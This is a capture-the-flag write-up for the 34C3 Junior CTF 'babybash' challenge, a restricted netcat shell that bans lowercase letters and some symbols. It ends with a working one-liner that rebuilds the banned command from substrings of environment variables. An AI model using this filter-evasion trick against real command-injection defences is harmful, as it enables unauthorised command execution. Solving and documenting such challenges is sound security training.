This is the write up for the Misc challenge "babybash" during the Junior CTF at the 34C3. 

When connected to the box via netcat, you were presented with a babybash prompt. 
A simple 
{% highlight bash %}
ls
{% endhighlight %}
threw an error message. It stated that illegal characters were used, and to run help
{% highlight bash %}
help
{% endhighlight %}
This printed the illegal characters:
* a-z
* .
* ?
* \*

and the hint to run ```/get_flag``` to retrieve the flag. The use of upper case letters was allowed, and therefore access to environment varaiables was possible. With clever use of the builtin substring feature in ```bash(1)``` the command could be assemble. 

For solving the challenge I used the following variables:
{% highlight bash %}
> $HOSTNAME
/bin/bash: 28e32c6defa5: command not found
> $PATH
/bin/bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
> $TERM
/bin/bash: xterm: command not found
> $SHELLOPTS
/bin/bash: braceexpand:hashall:interactive-comments: command not found
> $OSTYPE
/bin/bash: linux-gnu: command not found
> $PWD
/bin/bash: /tmp/4a7ddec13b10a2414e458491a00a37b275679ed2: Is a directory
{% endhighlight %}

The final solution:
{% highlight bash %}
/${OSTYPE:6:1}${TERM:2:1}${TERM:1:1}_${HOSTNAME:9:1}${SHELLOPTS:17:1}${SHELLOPTS:2:1}${OSTYPE:6:1} ${OSTYPE:6:1}${OSTYPE:1:1}${PWD:2:1}${PWD:2:1}${HOSTNAME:2:1}_FLAG_${PWD:3:1}${OSTYPE:0:1}${HOSTNAME:2:1}${SHELLOPTS:2:1}${SHELLOPTS:14:1}${HOSTNAME:2:1}
{% endhighlight %}
